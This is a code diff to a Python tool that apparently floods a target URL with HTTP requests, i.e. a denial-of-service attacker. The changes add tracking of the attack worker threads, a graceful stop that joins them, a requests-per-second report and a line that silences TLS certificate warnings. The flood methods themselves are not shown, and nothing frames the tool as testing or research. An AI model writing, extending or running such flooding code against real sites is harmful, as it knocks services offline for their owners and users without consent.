@@ -45,7 +45,9 @@ try:
     import netaddr # stuff with ip addresses
     import sqlite3 # database
     import textwrap # for the argparser module
+    from timeit import default_timer as timer
     from http.client import HTTPConnection # setting the "HTTP/" value
+    from urllib3.exceptions import InsecureRequestWarning # to disable that annoying "Insecure request!" warning
 except Exception as e:
     print(' - Error, failed to import standard library module.')
     print(f' - Stacktrace: \n{str(e).rstrip()}')
@@ -67,6 +69,7 @@ except Exception as e:
 
 # initialize colorama
 init(autoreset=True) # makes it so i don't need to do Fore.RESET at the end of every print()
+urllib3.disable_warnings(InsecureRequestWarning) # disables the warning
 
 utils().print_banner()
 if len(sys.argv) <= 1: # no arguments? just show all logs
@@ -199,10 +202,17 @@ SOFTWARE.
     Core.bypass_cache = True
 
     print(' + Launching attack.')
-    stoptime = stoptime = time.time() + args['duration']
+    stoptime, threadbox = time.time() + args['duration'], []
     for _ in range(args["workers"]):
-        threading.Thread(target=Core.methods.get(attack_method)['func'], args=(attack_id, args['target_url'], stoptime,)).start()
+        kaboom = threading.Thread(target=Core.methods.get(attack_method)['func'], args=(attack_id, args['target_url'], stoptime,))
 
+        threadbox.append(kaboom)
+
+        kaboom.start()
+    
+    Core.attackrunning = True # all threads have launched, lets start the attack
+
+    s_start = timer()
     while 1:
         try:
             utils().clear()
@@ -220,7 +230,17 @@ SOFTWARE.
 
         except KeyboardInterrupt:
             Core.attackrunning = False
+            Core.killattack = True
             break
     
     utils().clear()
+    print(' + Killing all threads, hold on.')
+    for thread in threadbox:
+        thread.join()
+    s_took = "%.2f" % (timer() - s_start)
+    
+    print(' + Threads killed')
+    
+    sent = str(Core.infodict[attack_id]['req_sent'])
+    print(f' + Average Requests Per Second: {str(float(sent)/float(s_took))}')
     print(' + Attack finished.')
